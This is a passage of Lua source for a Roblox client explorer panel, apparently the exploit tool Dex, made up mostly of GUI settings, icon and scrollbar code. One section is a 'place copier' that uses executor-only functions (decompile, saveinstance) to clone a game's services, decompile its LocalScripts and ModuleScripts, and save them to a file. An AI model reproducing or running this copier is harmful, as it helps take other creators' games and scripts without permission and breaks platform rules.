				if on then
					newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Status.Text = "On"
					Settings[interName] = true
				else
					newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					newSetting.Status.Text = "Off"
					Settings[interName] = false
				end
			end	

			newSetting.Change.MouseButton1Click:connect(function()
				toggle(not Settings[interName])
			end)

			newSetting.Visible = true
			newSetting.Parent = SettingList

			if defaultOn then
				toggle(true)
			end
		end

		createSetting("Click part to select","ClickSelect",false)
		createSetting("Selection Box","SelBox",false)
		createSetting("Clear property value on focus","ClearProps",false)
		createSetting("Select ungrouped models","SelectUngrouped",true)
		createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

		local function getSelection()
			local t = GetSelection:Invoke()
			if t and #t > 0 then
				return t[1]
			else
				return nil
			end
		end

		Mouse.Button1Down:connect(function()
			if CurrentWindow == "Explorer" and Settings.ClickSelect then
				local target = Mouse.Target
				if target then
					SetSelection:Invoke({target})
				end
			end
		end)

		TotallyNotSelectionChanged.Event:connect(function()
			if Settings.SelBox then
				local success,err = pcall(function()
					local selection = getSelection()
					SelectionBox.Adornee = selection
				end)
				if err then
					SelectionBox.Adornee = nil
				end
			end
		end)

		SettingsListener.OnInvoke = ReturnSetting

		-- Map Copier

		function createMapSetting(obj,interName,defaultOn)
			local function toggle(on)
				if on then
					obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Status.Text = "On"
					SaveMapSettings[interName] = true
				else
					obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					obj.Status.Text = "Off"
					SaveMapSettings[interName] = false
				end
			end	

			obj.Change.MouseButton1Click:connect(function()
				toggle(not SaveMapSettings[interName])
			end)

			obj.Visible = true
			obj.Parent = SaveMapSettingFrame

			if defaultOn then
				toggle(true)
			end
		end

		function createCopyWhatSetting(serv)
			if SaveMapSettings.CopyWhat[serv] then
				local newSetting = SaveMapCopyTemplate:Clone()
				newSetting.Position = UDim2.new(0,0,0,#SaveMapCopyList:GetChildren() * 22 + 5)
				newSetting.Info.Text = serv

				local function toggle(on)
					if on then
						newSetting.Change.enabled.Visible = true
						SaveMapSettings.CopyWhat[serv] = true
					else
						newSetting.Change.enabled.Visible = false
						SaveMapSettings.CopyWhat[serv] = false
					end
				end	

				newSetting.Change.MouseButton1Click:connect(function()
					toggle(not SaveMapSettings.CopyWhat[serv])
				end)

				newSetting.Visible = true
				newSetting.Parent = SaveMapCopyList
			end
		end

		createMapSetting(SaveMapSettingFrame.Scripts,"SaveScripts",true)
		createMapSetting(SaveMapSettingFrame.Terrain,"SaveTerrain",true)
		createMapSetting(SaveMapSettingFrame.Lighting,"LightingProperties",true)
		createMapSetting(SaveMapSettingFrame.CameraInstances,"CameraInstances",true)

		createCopyWhatSetting("Workspace")
		createCopyWhatSetting("Lighting")
		createCopyWhatSetting("ReplicatedStorage")
		createCopyWhatSetting("ReplicatedFirst")
		createCopyWhatSetting("StarterPack")
		createCopyWhatSetting("StarterGui")
		createCopyWhatSetting("StarterPlayer")

		SaveMapName.Text = tostring(game.PlaceId).."MapCopy"

		SaveMapButton.MouseButton1Click:connect(function()
			local copyWhat = {}

			local copyGroup = Instance.new("Model",game.ReplicatedStorage)

			local copyScripts = SaveMapSettings.SaveScripts

			local copyTerrain = SaveMapSettings.SaveTerrain

			local lightingProperties = SaveMapSettings.LightingProperties

			local cameraInstances = SaveMapSettings.CameraInstances

			-----------------------------------------------------------------------------------

			for i,v in pairs(SaveMapSettings.CopyWhat) do
				if v then
					table.insert(copyWhat,i)
				end
			end

			local consoleFunc = printconsole or writeconsole

			if consoleFunc then
				consoleFunc("Raspberry Pi's place copier loaded.")
				consoleFunc("Copying map of game "..tostring(game.PlaceId)..".")
			end

			function archivable(root)
				for i,v in pairs(root:GetChildren()) do
					if not game.Players:GetPlayerFromCharacter(v) then
						v.Archivable = true
						archivable(v)
					end
				end
			end

			function decompileS(root)
				for i,v in pairs(root:GetChildren()) do
					pcall(function()
						if v:IsA("LocalScript") then
							local isDisabled = v.Disabled
							v.Disabled = true
							v.Source = decompile(v)
							v.Disabled = isDisabled

							if v.Source == "" then 
								if consoleFunc then consoleFunc("LocalScript "..v.Name.." had a problem decompiling.") end
							else
								if consoleFunc then consoleFunc("LocalScript "..v.Name.." decompiled.") end
							end
						elseif v:IsA("ModuleScript") then
							v.Source = decompile(v)

							if v.Source == "" then 
								if consoleFunc then consoleFunc("ModuleScript "..v.Name.." had a problem decompiling.") end
							else
								if consoleFunc then consoleFunc("ModuleScript "..v.Name.." decompiled.") end
							end
						end
					end)
					decompileS(v)
				end
			end

			for i,v in pairs(copyWhat) do archivable(game[v]) end

			for j,obj in pairs(copyWhat) do
				if obj ~= "StarterPlayer" then
					local newFolder = Instance.new("Folder",copyGroup)
					newFolder.Name = obj
					for i,v in pairs(game[obj]:GetChildren()) do
						if v ~= copyGroup then
							pcall(function()
								v:Clone().Parent = newFolder
							end)
						end
					end
				else
					local newFolder = Instance.new("Model",copyGroup)
					newFolder.Name = "StarterPlayer"
					for i,v in pairs(game[obj]:GetChildren()) do
						local newObj = Instance.new("Folder",newFolder)
						newObj.Name = v.Name
						for _,c in pairs(v:GetChildren()) do
							if c.Name ~= "ControlScript" and c.Name ~= "CameraScript" then
								c:Clone().Parent = newObj
							end
						end
					end
				end
			end

			if workspace.CurrentCamera and cameraInstances then
				local cameraFolder = Instance.new("Model",copyGroup)
				cameraFolder.Name = "CameraItems"
				for i,v in pairs(workspace.CurrentCamera:GetChildren()) do v:Clone().Parent = cameraFolder end
			end

			if copyTerrain then
				local myTerrain = workspace.Terrain:CopyRegion(workspace.Terrain.MaxExtents)
				myTerrain.Parent = copyGroup
			end

			function saveProp(obj,prop,par)
				local myProp = obj[prop]
				if type(myProp) == "boolean" then
					local newProp = Instance.new("BoolValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "number" then
					local newProp = Instance.new("IntValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "string" then
					local newProp = Instance.new("StringValue",par)
					newProp.Name = prop
					newProp.Value = myProp
				elseif type(myProp) == "userdata" then -- Assume Color3
					pcall(function()
						local newProp = Instance.new("Color3Value",par)
						newProp.Name = prop
						newProp.Value = myProp
					end)
				end
			end

			if lightingProperties then
				local lightingProps = Instance.new("Model",copyGroup)
				lightingProps.Name = "LightingProperties"

				saveProp(game.Lighting,"Ambient",lightingProps)
				saveProp(game.Lighting,"Brightness",lightingProps)
				saveProp(game.Lighting,"ColorShift_Bottom",lightingProps)
				saveProp(game.Lighting,"ColorShift_Top",lightingProps)
				saveProp(game.Lighting,"GlobalShadows",lightingProps)
				saveProp(game.Lighting,"OutdoorAmbient",lightingProps)
				saveProp(game.Lighting,"Outlines",lightingProps)
				saveProp(game.Lighting,"GeographicLatitude",lightingProps)
				saveProp(game.Lighting,"TimeOfDay",lightingProps)
				saveProp(game.Lighting,"FogColor",lightingProps)
				saveProp(game.Lighting,"FogEnd",lightingProps)
				saveProp(game.Lighting,"FogStart",lightingProps)
			end

			if decompile and copyScripts then
				decompileS(copyGroup)
			end

			if SaveInstance then
				SaveInstance(copyGroup,SaveMapName.Text..".rbxm")
			elseif saveinstance then
				saveinstance(getelysianpath()..SaveMapName.Text..".rbxm",copyGroup)
			end
			--print("Saved!")
			if consoleFunc then
				consoleFunc("The map has been copied.")
			end
			SaveMapButton.Text = "The map has been saved"
			wait(5)
			SaveMapButton.Text = "Save"
		end)

		-- End Copier

		wait()

		IntroFrame:TweenPosition(UDim2.new(1,-300,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

		switchWindows("Explorer")

		wait(1)

		SideMenu.Visible = true

		for i = 0,1,0.1 do
			IntroFrame.BackgroundTransparency = i
			IntroFrame.Main.BackgroundTransparency = i
			IntroFrame.Slant.ImageTransparency = i
			IntroFrame.Title.TextTransparency = i
			IntroFrame.Version.TextTransparency = i
			IntroFrame.Creator.TextTransparency = i
			wait()
		end

		IntroFrame.Visible = false

		SlideFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		OpenScriptEditorButton:TweenPosition(UDim2.new(0,0,0,180),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		CloseToggleButton:TweenPosition(UDim2.new(0,0,0,210),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)
		Slant:TweenPosition(UDim2.new(0,0,0,240),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.5,true)

		wait(0.5)

		for i = 1,0,-0.1 do
			OpenScriptEditorButton.Icon.ImageTransparency = i
			CloseToggleButton.TextTransparency = i
			wait()
		end

		CloseToggleButton.Active = true
		CloseToggleButton.AutoButtonColor = true

		OpenScriptEditorButton.Active = true
		OpenScriptEditorButton.AutoButtonColor = true
	end)
	spawn(function()
		-- initial states
		local Option = {
			-- can modify object parents in the hierarchy
			Modifiable = false;
			-- can select objects
			Selectable = true;
		}

		-- MERELY

		Option.Modifiable = true

		-- END MERELY

		-- general size of GUI objects, in pixels
		local GUI_SIZE = 16
		-- padding between items within each entry
		local ENTRY_PADDING = 1
		-- padding between each entry
		local ENTRY_MARGIN = 1

		local Input = game:GetService("UserInputService")
		local HoldingCtrl = false
		local HoldingShift = false

--[[

# Explorer Panel

A GUI panel that displays the game hierarchy.


## Selection Bindables

- `Function GetSelection ( )`

	Returns an array of objects representing the objects currently
	selected in the panel.

- `Function SetSelection ( Objects selection )`

	Sets the objects that are selected in the panel. `selection` is an array
	of objects.

- `Event SelectionChanged ( )`

	Fired after the selection changes.


## Option Bindables

- `Function GetOption ( string optionName )`

	If `optionName` is given, returns the value of that option. Otherwise,
	returns a table of options and their current values.

- `Function SetOption ( string optionName, bool value )`

	Sets `optionName` to `value`.

	Options:

	- Modifiable

		Whether objects can be modified by the panel.

		Note that modifying objects depends on being able to select them. If
		Selectable is false, then Actions will not be available. Reparenting
		is still possible, but only for the dragged object.

	- Selectable

		Whether objects can be selected.

		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

		local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
		local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
		local HEADER_SIZE = ENTRY_SIZE*2

		local FONT = 'SourceSans'
		local FONT_SIZE do
			local size = {8,9,10,11,12,14,18,24,36,48}
			local s
			local n = math.huge
			for i = 1,#size do
				if size[i] <= GUI_SIZE then
					FONT_SIZE = i - 1
				end
			end
		end

		local GuiColor = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 96/255, 140/255, 211/255);
			BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- Icon map constants

		local MAP_ID = 483448923

		-- Indices based on implementation of Icon function.
		local ACTION_CUT         	 = 160
		local ACTION_COPY        	 = 161
		local ACTION_PASTE       	 = 162
		local ACTION_DELETE      	 = 163
		local ACTION_SORT        	 = 164
		local ACTION_CUT_OVER    	 = 174
		local ACTION_COPY_OVER   	 = 175
		local ACTION_PASTE_OVER  	 = 176
		local ACTION_DELETE_OVER	 = 177
		local ACTION_SORT_OVER  	 = 178
		local ACTION_EDITQUICKACCESS = 190
		local ACTION_FREEZE 		 = 188
		local ACTION_STARRED 		 = 189
		local ACTION_ADDSTAR 		 = 184
		local ACTION_ADDSTAR_OVER 	 = 187

		local NODE_COLLAPSED      = 165
		local NODE_EXPANDED       = 166
		local NODE_COLLAPSED_OVER = 179
		local NODE_EXPANDED_OVER  = 180

		local ExplorerIndex = {
			["Accessory"] = 32;
			["Accoutrement"] = 32;
			["AdService"] = 73;
			["Animation"] = 60;
			["AnimationController"] = 60;
			["AnimationTrack"] = 60;
			["Animator"] = 60;
			["ArcHandles"] = 56;
			["AssetService"] = 72;
			["Attachment"] = 34;
			["Backpack"] = 20;
			["BadgeService"] = 75;
			["BallSocketConstraint"] = 89;
			["BillboardGui"] = 64;
			["BinaryStringValue"] = 4;
			["BindableEvent"] = 67;
			["BindableFunction"] = 66;
			["BlockMesh"] = 8;
			["BloomEffect"] = 90;
			["BlurEffect"] = 90;
			["BodyAngularVelocity"] = 14;
			["BodyForce"] = 14;
			["BodyGyro"] = 14;
			["BodyPosition"] = 14;
			["BodyThrust"] = 14;
			["BodyVelocity"] = 14;
			["BoolValue"] = 4;
			["BoxHandleAdornment"] = 54;
			["BrickColorValue"] = 4;
			["Camera"] = 5;
			["CFrameValue"] = 4;
			["CharacterMesh"] = 60;
			["Chat"] = 33;
			["ClickDetector"] = 41;
			["CollectionService"] = 30;
			["Color3Value"] = 4;
			["ColorCorrectionEffect"] = 90;
			["ConeHandleAdornment"] = 54;
			["Configuration"] = 58;
			["ContentProvider"] = 72;
			["ContextActionService"] = 41;
			["CoreGui"] = 46;
			["CoreScript"] = 18;
			["CornerWedgePart"] = 1;
			["CustomEvent"] = 4;
			["CustomEventReceiver"] = 4;
			["CylinderHandleAdornment"] = 54;
			["CylinderMesh"] = 8;
			["CylindricalConstraint"] = 89;
			["Debris"] = 30;
			["Decal"] = 7;
			["Dialog"] = 62;
			["DialogChoice"] = 63;
			["DoubleConstrainedValue"] = 4;
			["Explosion"] = 36;
			["FileMesh"] = 8;
			["Fire"] = 61;
			["Flag"] = 38;
			["FlagStand"] = 39;
			["FloorWire"] = 4;
			["Folder"] = 70;
			["ForceField"] = 37;
			["Frame"] = 48;
			["GamePassService"] = 19;
			["Glue"] = 34;
			["GuiButton"] = 52;
			["GuiMain"] = 47;
			["GuiService"] = 47;
			["Handles"] = 53;
			["HapticService"] = 84;
			["Hat"] = 45;
			["HingeConstraint"] = 89;
			["Hint"] = 33;
			["HopperBin"] = 22;
			["HttpService"] = 76;
			["Humanoid"] = 9;
			["ImageButton"] = 52;
			["ImageLabel"] = 49;
			["InsertService"] = 72;
			["IntConstrainedValue"] = 4;
			["IntValue"] = 4;
			["JointInstance"] = 34;
			["JointsService"] = 34;
			["Keyframe"] = 60;
			["KeyframeSequence"] = 60;
			["KeyframeSequenceProvider"] = 60;
			["Lighting"] = 13;
			["LineHandleAdornment"] = 54;
			["LocalScript"] = 18;
			["LogService"] = 87;
			["MarketplaceService"] = 46;
			["Message"] = 33;
			["Model"] = 2;
			["ModuleScript"] = 71;
			["Motor"] = 34;
			["Motor6D"] = 34;
			["MoveToConstraint"] = 89;
			["NegateOperation"] = 78;
			["NetworkClient"] = 16;
			["NetworkReplicator"] = 29;
			["NetworkServer"] = 15;
			["NumberValue"] = 4;
			["ObjectValue"] = 4;
			["Pants"] = 44;
			["ParallelRampPart"] = 1;
			["Part"] = 1;
			["ParticleEmitter"] = 69;
			["PartPairLasso"] = 57;
			["PathfindingService"] = 37;
			["Platform"] = 35;
			["Player"] = 12;
			["PlayerGui"] = 46;
			["Players"] = 21;
			["PlayerScripts"] = 82;
			["PointLight"] = 13;
			["PointsService"] = 83;
			["Pose"] = 60;
			["PrismaticConstraint"] = 89;
			["PrismPart"] = 1;
			["PyramidPart"] = 1;
			["RayValue"] = 4;
			["ReflectionMetadata"] = 86;
			["ReflectionMetadataCallbacks"] = 86;
			["ReflectionMetadataClass"] = 86;
			["ReflectionMetadataClasses"] = 86;
			["ReflectionMetadataEnum"] = 86;
			["ReflectionMetadataEnumItem"] = 86;
			["ReflectionMetadataEnums"] = 86;
			["ReflectionMetadataEvents"] = 86;
			["ReflectionMetadataFunctions"] = 86;
			["ReflectionMetadataMember"] = 86;
			["ReflectionMetadataProperties"] = 86;
			["ReflectionMetadataYieldFunctions"] = 86;
			["RemoteEvent"] = 80;
			["RemoteFunction"] = 79;
			["ReplicatedFirst"] = 72;
			["ReplicatedStorage"] = 72;
			["RightAngleRampPart"] = 1;
			["RocketPropulsion"] = 14;
			["RodConstraint"] = 89;
			["RopeConstraint"] = 89;
			["Rotate"] = 34;
			["RotateP"] = 34;
			["RotateV"] = 34;
			["RunService"] = 66;
			["ScreenGui"] = 47;
			["Script"] = 6;
			["ScrollingFrame"] = 48;
			["Seat"] = 35;
			["Selection"] = 55;
			["SelectionBox"] = 54;
			["SelectionPartLasso"] = 57;
			["SelectionPointLasso"] = 57;
			["SelectionSphere"] = 54;
			["ServerScriptService"] = 0;
			["ServerStorage"] = 74;
			["Shirt"] = 43;
			["ShirtGraphic"] = 40;
			["SkateboardPlatform"] = 35;
			["Sky"] = 28;
			["SlidingBallConstraint"] = 89;
			["Smoke"] = 59;
			["Snap"] = 34;
			["Sound"] = 11;
			["SoundService"] = 31;
			["Sparkles"] = 42;
			["SpawnLocation"] = 25;
			["SpecialMesh"] = 8;
			["SphereHandleAdornment"] = 54;
			["SpotLight"] = 13;
			["SpringConstraint"] = 89;
			["StarterCharacterScripts"] = 82;
			["StarterGear"] = 20;
			["StarterGui"] = 46;
			["StarterPack"] = 20;
			["StarterPlayer"] = 88;
			["StarterPlayerScripts"] = 82;
			["Status"] = 2;
			["StringValue"] = 4;
			["SunRaysEffect"] = 90;
			["SurfaceGui"] = 64;
			["SurfaceLight"] = 13;
			["SurfaceSelection"] = 55;
			["Team"] = 24;
			["Teams"] = 23;
			["TeleportService"] = 81;
			["Terrain"] = 65;
			["TerrainRegion"] = 65;
			["TestService"] = 68;
			["TextBox"] = 51;
			["TextButton"] = 51;
			["TextLabel"] = 50;
			["Texture"] = 10;
			["TextureTrail"] = 4;
			["Tool"] = 17;
			["TouchTransmitter"] = 37;
			["TrussPart"] = 1;
			["UnionOperation"] = 77;
			["UserInputService"] = 84;
			["Vector3Value"] = 4;
			["VehicleSeat"] = 35;
			["VelocityMotor"] = 34;
			["WedgePart"] = 1;
			["Weld"] = 34;
			["Workspace"] = 19;
		}

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------

		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end

		local barActive = false
		local activeOptions = {}

		function createDDown(dBut, callback,...)
			if barActive then
				for i,v in pairs(activeOptions) do
					v:Destroy()
				end
				activeOptions = {}
				barActive = false
				return
			else
				barActive = true
			end
			local slots = {...}
			local base = dBut
			for i,v in pairs(slots) do
				local newOption = base:Clone()
				newOption.ZIndex = 5
				newOption.Name = "Option "..tostring(i)
				newOption.Parent = base.Parent.Parent.Parent
				newOption.BackgroundTransparency = 0
				newOption.ZIndex = 2
				table.insert(activeOptions,newOption)
				newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
				newOption.Text = slots[i]
				newOption.MouseButton1Down:connect(function()
					dBut.Text = slots[i]
					callback(slots[i])
					for i,v in pairs(activeOptions) do
						v:Destroy()
					end
					activeOptions = {}
					barActive = false
				end)
			end
		end

		-- Connects a function to an event such that it fires asynchronously
		function Connect(event,func)
			return event:connect(function(...)
				local a = {...}
				spawn(function() func(unpack(a)) end)
			end)
		end

		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end

		do
			local ZIndexLock = {}
			-- Sets the ZIndex of an object and its descendants. Objects are locked so
			-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
			-- ZIndex of the same object.
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end

			function SetZIndexOnChanged(object)
				return object.Changed:connect(function(p)
					if p == "ZIndex" then
						SetZIndex(object,object.ZIndex)
					end
				end)
			end
		end

		---- IconMap ----
		-- Image size: 256px x 256px
		-- Icon size: 16px x 16px
		-- Padding between each icon: 2px
		-- Padding around image edge: 1px
		-- Total icons: 14 x 14 (196)
		local Icon do
			local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
			game:GetService('ContentProvider'):Preload(iconMap)
			local iconDehash do
				-- 14 x 14, 0-based input, 0-based output
				local f=math.floor
				function iconDehash(h)
					return f(h/14%14),f(h%14)
				end
			end

			function Icon(IconFrame,index)
				local row,col = iconDehash(index)
				local mapSize = Vector2.new(256,256)
				local pad,border = 2,1
				local iconSize = 16

				local class = 'Frame'
				if type(IconFrame) == 'string' then
					class = IconFrame
					IconFrame = nil
				end

				if not IconFrame then
					IconFrame = Create(class,{
						Name = "Icon";
						BackgroundTransparency = 1;
						ClipsDescendants = true;
						Create('ImageLabel',{
							Name = "IconMap";
							Active = false;
							BackgroundTransparency = 1;
							Image = iconMap;
							Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
						});
					})
				end

				IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
				return IconFrame
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		---- ScrollBar
		do
			-- AutoButtonColor doesn't always reset properly
			local function ResetButtonColor(button)
				local active = button.Active
				button.Active = not active
				button.Active = active
			end

			local function ArrowGraphic(size,dir,scaled,template)
				local Frame = Create('Frame',{
					Name = "Arrow Graphic";
					BorderSizePixel = 0;
					Size = UDim2.new(0,size,0,size);
					Transparency = 1;
				})
				if not template then
					template = Instance.new("Frame")
					template.BorderSizePixel = 0
				end

				local transform
				if dir == nil or dir == 'Up' then
					function transform(p,s) return p,s end
				elseif dir == 'Down' then
					function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
				elseif dir == 'Left' then
					function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
				elseif dir == 'Right' then
					function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
				end

				local scale
				if scaled then
					function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
				else
					function scale(p,s) return p,s end
				end

				local o = math.floor(size/4)
				if size%2 == 0 then
					local n = size/2-1
					for i = 0,n do
						local t = template:Clone()
						local p,s = scale(transform(
							UDim2.new(0,n-i,0,o+i),
							UDim2.new(0,(i+1)*2,0,1)
							))
						t.Position = p
						t.Size = s
						t.Parent = Frame
					end
				else
					local n = (size-1)/2
					for i = 0,n do
						local t = template:Clone()
						local p,s = scale(transform(
							UDim2.new(0,n-i,0,o+i),
							UDim2.new(0,i*2+1,0,1)
							))
						t.Position = p
						t.Size = s
						t.Parent = Frame
					end
				end
				if size%4 > 1 then
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,0,0,size-o-1),
						UDim2.new(0,size,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
				return Frame
			end


			local function GripGraphic(size,dir,spacing,scaled,template)
				local Frame = Create('Frame',{
					Name = "Grip Graphic";
					BorderSizePixel = 0;
					Size = UDim2.new(0,size.x,0,size.y);
					Transparency = 1;
				})
				if not template then
					template = Instance.new("Frame")
					template.BorderSizePixel = 0
				end

				spacing = spacing or 2

				local scale
				if scaled then
					function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
				else
					function scale(p) return p end
				end

				if dir == 'Vertical' then
					for i=0,size.x-1,spacing do
						local t = template:Clone()
						t.Size = scale(UDim2.new(0,1,0,size.y))
						t.Position = scale(UDim2.new(0,i,0,0))
						t.Parent = Frame
					end
				elseif dir == nil or dir == 'Horizontal' then
					for i=0,size.y-1,spacing do
						local t = template:Clone()
						t.Size = scale(UDim2.new(0,size.x,0,1))
						t.Position = scale(UDim2.new(0,0,0,i))
						t.Parent = Frame
					end
				end

				return Frame
			end

			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
					Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
						Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
						BackgroundColor3 = GuiColor.Button;
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
						BackgroundColor3 = GuiColor.Button;
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
						Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = GuiColor.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
							BackgroundColor3 = GuiColor.Button;
							BorderColor3 = GuiColor.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = GuiColor.Border;
				})
				local graphicSize = GUI_SIZE/2

